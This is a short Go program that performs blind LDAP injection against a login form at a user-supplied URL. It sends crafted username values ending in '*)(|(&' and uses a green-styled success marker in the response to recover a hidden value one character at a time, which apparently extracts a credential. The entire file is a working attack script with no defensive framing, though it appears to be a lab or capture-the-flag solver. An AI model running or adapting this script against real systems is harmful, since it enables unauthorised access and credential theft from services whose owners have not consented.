package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
	"io/ioutil"
)

var charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._!@#$%^&*()"

func main() {
	var baseURL string

	stat, _ := os.Stdin.Stat()
	if (stat.Mode() & os.ModeCharDevice) == 0 {
		reader := bufio.NewReader(os.Stdin)
		baseURL, _ = reader.ReadString('\n')
		baseURL = strings.TrimSpace(baseURL)
	} else {
		fmt.Print("Enter base URL: ")
		reader := bufio.NewReader(os.Stdin)
		baseURL, _ = reader.ReadString('\n')
		baseURL = strings.TrimSpace(baseURL)
	}

	successfulChars := ""
	successfulResponseFound := true

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	for successfulResponseFound {
		successfulResponseFound = false

		for _, char := range charSet {
			data := url.Values{}
			data.Set("username", fmt.Sprintf("%s%c*)(|(&", successfulChars, char))
			data.Set("password", "pwd)")

			req, err := http.NewRequest("POST", baseURL, strings.NewReader(data.Encode()))
			if err != nil {
				fmt.Println("Error creating request:", err)
				return
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Request error:", err)
				return
			}
			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				fmt.Println("Error reading response:", err)
				return
			}

			if strings.Contains(string(body), `style="color: green;"`) {
				successfulResponseFound = true
				successfulChars += string(char)
				fmt.Printf("Successful character found: %c\n", char)
				break
			}
		}

		if !successfulResponseFound {
			fmt.Println("No successful character found")
		}
	}

	fmt.Printf("Payload: %s\n", successfulChars)
}
